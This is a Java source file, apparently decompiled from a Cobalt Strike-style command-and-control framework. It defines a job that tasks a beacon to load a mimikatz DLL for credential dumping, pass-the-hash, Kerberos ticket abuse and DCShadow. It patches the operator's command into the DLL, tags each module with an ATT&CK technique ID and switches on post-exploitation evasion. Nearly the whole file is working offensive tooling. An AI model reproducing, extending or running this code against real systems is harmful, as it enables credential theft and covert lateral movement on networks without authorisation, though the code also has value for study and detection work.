package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class MimikatzJob extends Job {
   protected String commandz;

   public MimikatzJob(TaskBeacon var1, String var2) {
      super(var1);
      this.commandz = var2;
   }

   public String getDescription() {
      return "Tasked beacon to run mimikatz's " + this.commandz + " command";
   }

   public String getShortDescription() {
      return "mimikatz " + this.commandz.split(" ")[0];
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/mimikatz-full.x64.dll" : "resources/mimikatz-full.x86.dll";
   }

   public int getJobType() {
      return this.commandz.startsWith("@") ? 62 : 40;
   }

   public String getPipeName() {
      return "mimikatz";
   }

   public int getCallbackType() {
      return 32;
   }

   public int getWaitTime() {
      return 15000;
   }

   public byte[] fix(byte[] var1) {
      Packer var2 = new Packer();
      var2.addStringUTF8(this.commandz, 512);
      var1 = CommonUtils.patch(var1, "MIMIKATZ ABCDEFGHIJKLMNOPQRSTUVWXYZ", CommonUtils.bString(var2.getBytes()));
      return var1;
   }

   public String getTactic() {
      if (CommonUtils.isin("lsadump::dcshadow", this.commandz)) {
         return "T1207";
      } else if (CommonUtils.isin("sekurlsa::pth", this.commandz)) {
         return "T1075";
      } else if (CommonUtils.isin("lsadump::", this.commandz)) {
         return "T1003";
      } else if (CommonUtils.isin("kerberos::", this.commandz)) {
         return "T1097";
      } else if (CommonUtils.isin("sekurlsa::", this.commandz)) {
         return "T1003, T1055";
      } else {
         return CommonUtils.isin("sid::", this.commandz) ? "T1178" : "";
      }
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
